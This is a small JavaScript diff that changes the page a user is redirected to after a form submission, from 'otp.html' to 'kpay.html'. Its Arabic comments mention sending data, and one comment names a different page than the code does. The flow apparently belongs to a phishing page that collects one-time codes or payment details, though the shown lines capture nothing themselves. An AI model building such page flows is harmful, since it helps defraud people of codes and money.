@@ -34,7 +34,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    window.location.href = "otp.html";  // توجيه المستخدم إلى صفحة eror.html عند نجاح الإرسال
+                    window.location.href = "kpay.html";  // توجيه المستخدم إلى صفحة eror.html عند نجاح الإرسال
                 } else {
                     alert("فشل في إرسال البيانات. يرجى المحاولة مرة أخرى.");
                 }
